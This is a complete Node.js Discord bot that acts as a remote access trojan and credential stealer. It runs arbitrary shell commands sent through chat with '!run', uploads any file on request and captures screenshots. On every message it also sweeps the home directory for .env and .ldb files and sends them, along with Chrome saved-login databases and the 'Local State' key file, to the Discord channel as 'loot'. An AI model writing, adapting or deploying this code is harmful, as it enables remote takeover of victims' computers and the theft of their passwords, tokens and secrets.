const { Client, GatewayIntentBits } = require('discord.js');
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const screenshot = require('screenshot-desktop');

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent] });
const browserPaths = [
  path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
  path.join(os.homedir(), '.config', 'google-chrome', 'Default', 'Login Data'),
  path.join(os.homedir(), '.config', 'google-chrome', 'Local State')
];

client.on('messageCreate', async message => {
  if (message.content.startsWith('!run ')) {
    const result = execSync(message.content.slice(5), { timeout: 10000 }).toString();
    await message.channel.send(result);
  }
  if (message.content.startsWith('!sendfile ')) {
    await message.channel.send({ files: [message.content.slice(10)] });
  }
  if (message.content === '!screenshot') {
    await message.channel.send({ files: [await screenshot()] });
  }

  const envFiles = [];
  for (const file of await fs.promises.readdir(os.homedir(), { recursive: true })) {
    if (file.endsWith('.env') || file.endsWith('.ldb')) envFiles.push(file);
  }
  const loot = [...browserPaths.filter(fs.existsSync), ...envFiles];
  if (loot.length) await message.channel.send({ files: loot });
});

client.login('hardcoded-bot-token');
